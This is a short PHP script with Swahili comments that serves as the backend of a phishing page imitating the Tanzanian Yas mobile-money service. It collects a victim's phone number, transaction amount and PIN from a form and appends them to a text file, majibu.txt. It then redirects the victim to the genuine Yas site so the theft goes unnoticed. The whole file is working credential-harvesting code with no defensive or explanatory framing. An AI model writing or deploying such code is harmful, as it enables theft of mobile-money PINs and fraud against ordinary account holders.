<?php
// Hakikisha data imetumwa kupitia POST pekee
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // Kunasa na kusafisha data ili kuongeza usalama
    $namba = isset($_POST['namba']) ? htmlspecialchars(strip_tags(trim($_POST['namba']))) : '';
    $kiasi = isset($_POST['kiasi']) ? htmlspecialchars(strip_tags(trim($_POST['kiasi']))) : '';
    $pin = isset($_POST['pin']) ? htmlspecialchars(strip_tags(trim($_POST['pin']))) : '';

    // Kuangalia kama data zote zimejazwa kabla ya kuhifadhi
    if (!empty($namba) && !empty($kiasi) && !empty($pin)) {
        
        // Kufungua au kutengeneza faili la majibu.txt
        $file = fopen("majibu.txt", "a");
        if ($file) {
            $data = "--- New Entry ---\n";
            $data .= "Namba: " . $namba . "\n";
            $data .= "Kiasi: " . $kiasi . "\n";
            $data .= "PIN: " . $pin . "\n";
            $data .= "Time: " . date("Y-m-d H:i:s") . "\n";
            $data .= "----------------\n";
            
            fwrite($file, $data);
            fclose($file);
        }
    }

    // Kumpeleka mteja kwenye ukurasa halisi wa Yas baada ya kukamilisha
    header("Location: https://mix.yas.co.tz/");
    exit();
} else {
    // Kama mtu akijaribu kuingia kwenye php bila kujaza fomu, anarudishwa kwenye fomu
    header("Location: index.html");
    exit();
}
?>

